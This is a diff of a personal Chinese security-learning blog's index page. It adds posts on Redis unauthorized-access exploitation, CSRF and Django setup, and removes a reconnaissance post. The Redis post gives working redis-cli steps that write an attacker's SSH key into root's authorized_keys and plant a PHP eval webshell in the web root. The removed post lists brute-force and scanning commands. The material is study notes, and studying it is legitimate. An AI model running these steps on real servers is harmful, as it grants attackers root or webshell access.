@@ -244,6 +244,182 @@
   
   
 
+  <article class="post post-type-漏洞学习" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Redis-未授权访问（反弹shell）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Redis-未授权访问（反弹shell）/" itemprop="url">Redis-未授权访问（反弹shell）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h4><p>环境：Centos 7</p>
+<ol>
+<li>wget 获取 redis 安装包<blockquote>
+<p>[ root@test ]#  wget <a href="http://download.redis.io/releases/redis-4.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-4.0.8.tar.gz</a></p>
+</blockquote>
+</li>
+<li>解压<blockquote>
+<p>[ root@test ]#  tar -zxvf redis-4.0.8.tar.gz</p>
+</blockquote>
+</li>
+<li>yum安装gcc依赖<blockquote>
+<p>[ root@test ]#  yum install gcc</p>
+</blockquote>
+</li>
+<li>编译<blockquote>
+<p>[ root@test redis-4.0.6 ]#  make MALLOC=libc</p>
+</blockquote>
+</li>
+<li>将/redis-4.0.6/src目录下的文件加到/usr/local/bin目录<blockquote>
+<p>[ root@test redis-4.0.6 ]#  cd src &amp;&amp; make install</p>
+</blockquote>
+</li>
+<li><p>启动</p>
+<blockquote>
+<p>[ root@test src ]# ./redis-server</p>
+</blockquote>
+<p>如图即成功启动<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9e65fefa59e87728.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+</li>
+</ol>
+<h4 id="反弹-shell-方法"><a href="#反弹-shell-方法" class="headerlink" title="反弹 shell 方法"></a>反弹 shell 方法</h4><h5 id="1-通过写SSH-KEY的方式获取shell"><a href="#1-通过写SSH-KEY的方式获取shell" class="headerlink" title="1.通过写SSH-KEY的方式获取shell"></a>1.通过写<code>SSH-KEY</code>的方式获取<code>shell</code></h5><p>利用条件：<br><code>redis</code> 以<code>root</code> 权限开启<br><code>6379</code> 端口开启并允许外部使用<br>目标服务器支持免密登录</p>
+<ol>
+<li>攻击机本地生成<code>ssh</code>秘钥<blockquote>
+<p>[ root@test ]# ssh-keygen -t rsa</p>
+</blockquote>
+</li>
+<li>将公钥导出写入<code>txt</code>文件方便利用<blockquote>
+<p>[ root@test:~/.ssh ]# (echo -e “\n\n\n\n”; cat id_rsa.pub; echo -e “\n\n\n\n”) &gt;123.txt</p>
+</blockquote>
+</li>
+<li>利用<code>redis-cli</code>进行远程连接<blockquote>
+<p>[ root@test ] redis-cli -h 靶机ip</p>
+</blockquote>
+</li>
+<li>设置<code>redis</code>工作路径、文件、写入公钥并保存<blockquote>
+<p>靶机ip:6379&gt; config set dir /root/.ssh/<br>OK<br>靶机ip:6379&gt; config get dir<br>“dir”<br>“/root/.ssh”<br>靶机ip:6379&gt; config set dbfilename “authorized_keys”<br>OK<br>靶机ip:6379&gt; save<br>OK</p>
+</blockquote>
+</li>
+<li>远程连接，利用自己的私钥登录服务器<blockquote>
+<p>ssh -i id_rsa root@靶机ip</p>
+</blockquote>
+</li>
+</ol>
+<h5 id="2-向Web路径写webshell"><a href="#2-向Web路径写webshell" class="headerlink" title="2. 向Web路径写webshell"></a>2. 向<code>Web</code>路径写<code>webshell</code></h5><p>利用条件：<br>知道<code>web</code>目录<br>具有写入文件的权限</p>
+<blockquote>
+<p>靶机ip:6379&gt; config set dir /var/www/html/<br>OK<br>靶机ip:6379&gt; config set dbfilename shell.php<br>OK<br>靶机ip:6379&gt; set x “&lt;?php @eval($_POST[‘wcute’]);?&gt;”<br>OK<br>靶机ip:6379&gt; save<br>OK</p>
+</blockquote>
+<p>成功写入后可利用菜刀连接</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
   
   
@@ -413,12 +589,12 @@
   
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-漏洞学习" itemscope="" itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试前期---信息搜集/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/CSRF漏洞学习/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -437,7 +613,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/12/09/渗透测试前期---信息搜集/" itemprop="url">渗透测试前期--信息搜集</a></h1>
+                <a class="post-title-link" href="/2018/12/09/CSRF漏洞学习/" itemprop="url">CSRF漏洞学习</a></h1>
         
 
         <div class="post-meta">
@@ -459,28 +635,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Metasploit-渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">Metasploit 渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -511,141 +665,1101 @@
       
         
           
-            <p>##Web 信息搜集：</p>
-<ol>
-<li>Web 信息搜集（探测）即 Web 踩点，主要是掌握目标Web服务的方方面面，是实现Web渗透入侵前的准备工作</li>
-<li>Web 踩点内容包括操作系统（linux、windows等）、服务器类型（服务器平台、版本等）、数据库类型（access、sqlsever、mysql、oracle、postgresql等）、Web 容器（iis、Apache、nginx、tomcat等）、脚本类型（ASP、php/jsp、aspx等）、域名信息、网站目录、CMS、WAF等</li>
-<li>Web 信息搜集涉及搜索引擎、网站扫描、域名遍历、指纹识别等工作<h2 id="一-外围信息搜集"><a href="#一-外围信息搜集" class="headerlink" title="一. 外围信息搜集"></a>一. 外围信息搜集</h2></li>
+            <h4 id="CSRF-定义"><a href="#CSRF-定义" class="headerlink" title="CSRF 定义"></a>CSRF 定义</h4><p>跨站请求伪造，是一种“挟持用户”在当前已登录的Web应用程序上执行“非本意的操作”的攻击方法。</p>
+<h4 id="CSRF攻击攻击原理及过程"><a href="#CSRF攻击攻击原理及过程" class="headerlink" title="CSRF攻击攻击原理及过程"></a>CSRF攻击攻击原理及过程</h4><ol>
+<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
+<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li>
+<li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li>
+<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
+<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </li>
 </ol>
-<h4 id="1-通过DNS和IP挖掘目标网络信息"><a href="#1-通过DNS和IP挖掘目标网络信息" class="headerlink" title="1. 通过DNS和IP挖掘目标网络信息"></a>1. 通过DNS和IP挖掘目标网络信息</h4><pre><code>1. whois域名注册信息查询
-  msf &gt; whois testfire.net
-    nslookup与dig域名查询IP2Location地理位置查询    
-        dig @&lt;DNS 服务器&gt; &lt;待查询的域名&gt;
-        http://www.maxmind.com
-2. Google Maps
-        http://www.cz88.net(国内IP查询)
-3. netcraft网站提供的信息查询服务
-        http://searchdns.netcraft.com/ (查询子域名)
-        https://toolbar.netcraft.com/site_report
-4. IP2Domain 反查域名
-        http://www.webscan.cc/
-</code></pre><h4 id="2-通过搜索引擎进行信息搜集"><a href="#2-通过搜索引擎进行信息搜集" class="headerlink" title="2. 通过搜索引擎进行信息搜集"></a>2. 通过搜索引擎进行信息搜集</h4><pre><code>1. Google Hacking
-    可使用参数：site  filetype inurl intitle intext
-    举例：
-          inurl:/admin/login.php             # 搜索网址中有 &quot;/admin/login.php&quot; 的网页
-          intitle:后台管理 filetypr:php       # 搜索标题是后台管理的 php 页面
-          intitle:index of&quot;parent directory&quot; # 搜索根目录相关的索引目录信息
-          intext:Powered by wordpress        # 搜索 wordpress 制作的博客网址
-          intext:Powered by *CMS             # 搜索*CMS相关的页面
-          intext:powered by xxx inurl:login  # 搜索此类网址的后台登录页面
-2. 探索网站目录结构
-     敏感目录收集方向：robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件
-    Google 搜索 parent directory site:baidu.com
-        1. 扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名／口令等，
-        2. 扩展名为bak的文件：通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。
-        3. 扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息
-3. 搜索网站中的E-mail地址
-    msf中search_email_collector模块通过多个搜索引擎的查询结果分析使用此后缀的邮件地址从而获取某个机构的大量邮件地址
-4. 搜索易存在SQL注入点的页面
-    Google搜索 site:testfire.net inurl:login
-5. shodan 搜索
-</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/12585049-ab635edd3371c5f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<h2 id="二-主机探测与端口扫描"><a href="#二-主机探测与端口扫描" class="headerlink" title="二.主机探测与端口扫描"></a>二.主机探测与端口扫描</h2><h4 id="1-活跃主机扫描"><a href="#1-活跃主机扫描" class="headerlink" title="1.活跃主机扫描"></a>1.活跃主机扫描</h4><pre><code>1. ICMP Ping 命令
-2. Metasploit的主机发现模块
-    常用模块
-    arp_sweep 使用ARP请求枚举本地局域网中的所有活跃主机
-    udp_sweep 通过发送UDP数据包探查制定主机是否活跃，并发现主机上的UDP服务
-    arpping(不支持同一网段扫描)
-    arping IP   
-    arping IP -c 1       //一次返回一条数据
-3. 使用Nmap进行主机探测(支持同一网段扫描)
-    nmap -sn IP            //扫描存活主机，只做ping扫描不做端口扫描
-4. arp侦查-netdiscover
-    主动探测
-    netdiscover -i eth0 -r 192.168.1.1/24  // -i 指定网卡 -r 指定ip范围
-    被动探测
-    netdiscover -p
-</code></pre><h4 id="2-操作系统辨识"><a href="#2-操作系统辨识" class="headerlink" title="2. 操作系统辨识"></a>2. 操作系统辨识</h4><pre><code>Nmap 扫描 -O 参数对目标操作系统进行识别
-Nmap 扫描 -sV 参数对其服务版本进行识别
-</code></pre><h4 id="3-端口扫描与服务类型探测"><a href="#3-端口扫描与服务类型探测" class="headerlink" title="3. 端口扫描与服务类型探测"></a>3. 端口扫描与服务类型探测</h4><pre><code>    端口扫描工具：nmap portscan ntscan telnet
-1. Metasploit 中的端口扫描器
-    msf &gt; search portscan
-    ack：通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测
-    ftpbounce：通过 FTP bounce 攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTP bounce 攻击，但在一些旧的 Solaris及 FREEBSD系统的FTP服务中此类攻击方式仍能够b被利用
-    syn：使用发送 TCP SYN 标志的方式探测开放的端口
-    tcp：通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢。
-    xmas：一种更为隐秘的扫描方式，通过发送FIN、PSH和URG标志，能够躲避一些高级的TCP标记监测器的过滤。
-2. Nmap端口扫描功能
-   常见端口
-    IIS（HTTP）：80
-    SQLServer：1433        爆破
-    Oracle：1521
-    MySQL：3306        爆破
-    FTP：21        匿名访问
-    SSH：22        hydra爆破
-    Tomcat：8080
-    SSL服务：443        心脏出血漏洞 1.0.1g版本之前
-    Redis：6379        未授权访问
-    weblogic：7001        SSRF/反序列化漏洞、控制台部署 getshell
-    zabbix控制台：8069        弱口令/注入
-    elasticsearch：9200        远程代码执行漏洞
-    memcacache：1121        未授权访问
-    mongondb：27017        未授权访问      
-    RDP远程桌面：3389        爆破  
-    Weblogic默认端口:7001    
-    端口类型:
-        open：一个应用程序正在此端口上进行监听，以接收来自TCP、UDP或SCTP协议的数据。这是在渗透测试中最关注的一类端口，开放端口往往能够为我们提供一条能够进入系统的攻击路径.（端口开放）
-        closed：关闭的端口指的是主机已响应，但没有应用程序监听的端口。这些信息并非毫无价值，扫描出关闭端口至少说明主机是活跃的。（端口关闭）
-        filtered：指Nmap不能确认端口是否开放，但根据响应数据猜测该端口可能被防火墙等设备过滤
-        unfiltered：仅在使用ACK扫描时，Nmap无法确定端口是否开放，会归为此类。可以使用其他类型的扫描（如Window扫描、SYN扫描、FIN扫描）进一步确认端口的信息。
-       open|filtered：端口开放或屏蔽
-    常用的Nmap扫描类型参数主要有：
-        -p | -F ：-p 指定端口 | -F 执行快速扫描 
-        -sT： TCP connect扫描，类似Metasploit中的tcp扫描模块
-        -ss： TCP SYN扫描，类似 Metasploit中的syn扫描模块。
-        -sF/-sX/-sN：这些扫描通过发送一些特殊的标志位以避开设备或软件的监测。
-        -sP：通过发送 ICMP echo请求探测主机是否存活，原理同Ping。
-        -sU：探测目标主机开放了哪些UDP端口
-        -sA： TCP ACK扫描，类似 Metasploit中的ack扫描模块
-</code></pre><h4 id="4-指纹识别"><a href="#4-指纹识别" class="headerlink" title="4. 指纹识别"></a>4. 指纹识别</h4><pre><code>1. whatweb 获取目标网站的系统、容器、脚本、版本信息
-   whatweb -h                  # 查看参数
-   whatweb url/ip              # 基础扫描
-   whatweb -a 3 -v url/ip      # 详细扫描
-2. 御剑指纹识别
-</code></pre><h2 id="三、服务器扫描与查点"><a href="#三、服务器扫描与查点" class="headerlink" title="三、服务器扫描与查点"></a>三、服务器扫描与查点</h2><h4 id="1-常见网络服务扫描"><a href="#1-常见网络服务扫描" class="headerlink" title="1. 常见网络服务扫描"></a>1. 常见网络服务扫描</h4><pre><code>1. Telnet 服务扫描
-    msf &gt; use auxiliary/scanner/telnet/telnet_version
-2. SSH 服务扫描
-    msf &gt; use auxiliary/scanner/ssh/ssh_version
-3. Oracle 数据库服务查点
-    msf &gt; use auxiliary/scanner/oracle/tnslsnr_version
-4. 开放代理探测与利用
-    设置代理服务器
-    msf &gt; use auxiliary/scanner/http/open_proxy 
-5. nmap服务器扫描
-    -sV：版本探测
-    -O：启用操作系统探测
-    --osscan-limit：对指定的目标系统进行操作系统探测
-</code></pre><h4 id="2-口令猜测与嗅探"><a href="#2-口令猜测与嗅探" class="headerlink" title="2. 口令猜测与嗅探"></a>2. 口令猜测与嗅探</h4><pre><code> 1. SSH服务口令猜测
-    msf &gt; use auxiliary/scanner/ssh/ssh_login
-    msf &gt; set RHOSTS x.x.x.x
-    msf &gt; set USERNAME root
-    msf &gt; set PASS_FILE /root/words.txt
-    msf &gt; set THREADS 50
-    msf &gt; run
-2. psnuffle 口令嗅探
-    截获常见协议的身份认证过程
-    msf &gt; use auxiliary/sniffer/psnuffle
-</code></pre><h2 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h2><pre><code>1. 弱口令默认后台：admin，admin/login.asp，manage，login.asp等常见后台
-2. 查看网页的链接：一般来说，网站的主页有管理登录类似的东西，有些可能被管理员删除
-3. 查看网站图片的属性
-4. 查看网站使用的管理系统，从而确定后台
-5. 用工具查找：www.scan，intellitamper，御剑
-6. robots.txt 的帮助：robots.txt文件告诉支柱程序在服务器上什么样的文件可以被查看
-7. GooglHacker
-8. 查看网站使用的编辑器是否有默认后台
-9. 短文件利用
-10. sqlmap --sql-shell load_file(&apos;&apos;);
-</code></pre>
+<h4 id="CSRF漏洞的分类及检测挖掘方法"><a href="#CSRF漏洞的分类及检测挖掘方法" class="headerlink" title="CSRF漏洞的分类及检测挖掘方法"></a>CSRF漏洞的分类及检测挖掘方法</h4><ul>
+<li>第一种：<br>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。<br>检测方法：<br>网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。</li>
+<li>第二种：<br>请求是个POST请求，post请求中没有<code>token</code>参数，然后请求也没有验证<code>referer</code>信息。这种是存在CSRF情况最多的一种。<br>检测方法：<br>网页操作某功能，抓包后，如果发现没有<code>token</code>等参数，然后就将<code>referer</code>信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将<code>referer</code>也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个<code>form</code>表单的，然后将服务器<code>form</code>表单的<code>URL</code>作为CSRF攻击进行利用的，或者用<code>js</code>代码生成<code>form</code>表单，或者用<code>ajax</code>实现。</li>
+<li>第三种：<br>请求是POST，<code>post</code>请求中没有<code>token</code>参数，但是验证了<code>referer</code>信息。然而可以将<code>post</code>请求改写为<code>get</code>请求，然后通过第一种情况下的那个方法利用。<br>检测方法：<br>就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用<code>$_POST</code>而是用的类似于<code>$_REQUEST</code>这种<code>post</code>，<code>get</code>请求的参数都可以接收的写法。</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-Python" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（Django安装）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django---简单博客搭建（Django安装）/" itemprop="url">Django---简单博客搭建（Django安装）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h4><ol>
+<li>安装<blockquote>
+<p>pip install Django==1.10.2</p>
+</blockquote>
+</li>
+<li>查看是否安装成功<blockquote>
+<p>python -m django version</p>
+</blockquote>
+</li>
+<li>创建新项目<blockquote>
+<p>D:\python&gt;django-admin startproject myblog</p>
+</blockquote>
+</li>
+</ol>
+<p>此时自建项目目录生成</p>
+<ul>
+<li><p>目录结构:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">manage.py            与项目进行交互的命令行工具集的入口</span><br><span class="line"></span><br><span class="line">myblog               项目容器，包含项目最基本的一些配置，目录名不建议修改</span><br><span class="line"></span><br><span class="line">__init__.py          python 中声名模块的文件，默认内容为空</span><br><span class="line"></span><br><span class="line">settings.py          项目总配置文件（数据库、Web应用、时间等配置）</span><br><span class="line"></span><br><span class="line">urls.py              url 配置文件</span><br><span class="line"></span><br><span class="line">wsgi.py              python 与web服务器网关接口</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动django自带的服务器</p>
+<blockquote>
+<p>python manage.py runserver 【端口】</p>
+</blockquote>
+</li>
+</ul>
+<p>显示默认web地址和端口 ，更改端口只需在命令后面加上使用的端口号</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-19607cf2914561ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<h4 id="应用创建"><a href="#应用创建" class="headerlink" title="应用创建"></a>应用创建</h4><p>创建步骤：</p>
+<ol>
+<li>打开命令行，进入manage.py 的同级目录</li>
+<li>输入：python manage.py startapp blog</li>
+<li>添加应用名到 settings.py 中的 INSTALLED_APPS里</li>
+</ol>
+<ul>
+<li><p>应用目录结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">migrations     数据移植模块，内容自动生成</span><br><span class="line"></span><br><span class="line">admin.py       后台管理系统配置</span><br><span class="line"></span><br><span class="line">apps.py        该应用的一些配置，Django-1.9以后自动生成</span><br><span class="line"></span><br><span class="line">models.py      数据模块</span><br><span class="line"></span><br><span class="line">tests.py       自动化测试模块，可在此编写测试脚本</span><br><span class="line"></span><br><span class="line">views.py       执行响应的代码所在模块，代码逻辑处理主要地点，大部分代码在此编写</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建第一个响应页面</p>
+</li>
+</ul>
+<ol>
+<li>在 blog 的 views.py 编写代码并保存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line"></span><br><span class="line">return HttpResponse(&apos;hello&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>注：每个响应对应一个函数，函数必须返回一个响应<br>函数必须存在一个参数，一般约定为 request<br>每一个响应函数对应一个URL</p>
+<ol start="2">
+<li>进入 myblog 的配置文件 settings.py，在 INSTALLED_APPS 中添加 blog 应用</li>
+<li>进入 myblog 的url配置文件 urls.py，导入模块并配置url</li>
+</ol>
+<ul>
+<li>URL 配置一<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import blog.views as asd</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^admin/&apos;, admin.site.urls),</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, asd.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>注：URL函数有三个参数：URL（正则），对应方法，名称<br>URL函数存放在 urlpatterns 列表中</p>
+<ul>
+<li>URL配置二</li>
+</ul>
+<p>(1)  在 myblog 的 urls.py 中导入 include 模块，并在urlpatterns中添加url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url,include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, include(&apos;blog.urls&apos;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
+<p>(2) blog目录下创建urls.py 编写 url 访问方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^$&apos;, views.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
+<ol start="4">
+<li>启动服务器python manage.py runserver</li>
+<li>打开浏览器，访问 <a href="http://127.0.0.1:8000/index/" target="_blank" rel="noopener">http://127.0.0.1:8000/index/</a></li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4b20e6314620a2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-Python" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django--（Models）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django--（Models）/" itemprop="url">Django--（Models）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li><p>Models<br>通常一个 Model 对应数据库的一张数据表，Django 中 Models 以类的形式表现<br>包含一些基本字段以及数据的一些行为</p>
+</li>
+<li><p>ORM<br>对象关系映射，实现了对象和数据库之间的映射<br>隐藏了数据访问的细节，不需要编写 SQL 语句</p>
+</li>
+<li><p>Models 创建</p>
+</li>
+</ul>
+<ol>
+<li>在应用根目录下创建 models.py ，并引入 models 模块（一般django自动创建）</li>
+<li>创建类，继承 models.Model ，该类即是一张数据表</li>
+<li>在类中创建字段，字段即类里面的属性（变量）</li>
+<li>生成数据表<blockquote>
+<p>cmd 进入 manage.py 同级目录<br>执行 python manage.py makemigrations app名（可选）<br>执行 python manage.py migrate</p>
+</blockquote>
+</li>
+<li>数据表查看 sql 语句<blockquote>
+<p>Django 会自动在 app/migrations/ 目录下生成移植文件<br>python manage.py sqlmigrate 应用名 移植文件id </p>
+</blockquote>
+</li>
+<li>页面呈现数据</li>
+</ol>
+<ul>
+<li><p>后台</p>
+<blockquote>
+<p>views.py 中 import models<br>article = models.Article.objects.get(pk=1)<br>render(request,page,{‘article’:article})</p>
+</blockquote>
+</li>
+<li><p>前端</p>
+<blockquote>
+<p>index.html</p>
+
+<p> 显示数据<br>此时访问 <a href="http://127.0.0.1:8000/blog/" target="_blank" rel="noopener">http://127.0.0.1:8000/blog/</a> 显示id=1的 title 和 content 内容 </p>
+</blockquote>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
